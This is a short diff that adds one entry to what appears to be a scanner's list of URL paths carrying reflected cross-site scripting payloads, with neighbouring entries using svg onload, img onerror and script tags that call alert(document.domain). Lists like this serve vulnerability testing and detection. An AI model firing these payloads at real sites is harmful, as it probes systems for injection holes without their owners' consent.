@@ -962,3 +962,4 @@ request?info=<svg onload=alert(
 /server-common/cgi-bin/login
 /siam-convite/qrcode.jsp?url=1%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
 /response-headers?Content-Type=text/html&Server=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/browser_search_plugin.php?type=text%27%22()%26%25<acx><ScRiPt>alert(document.domain)</ScRiPt>
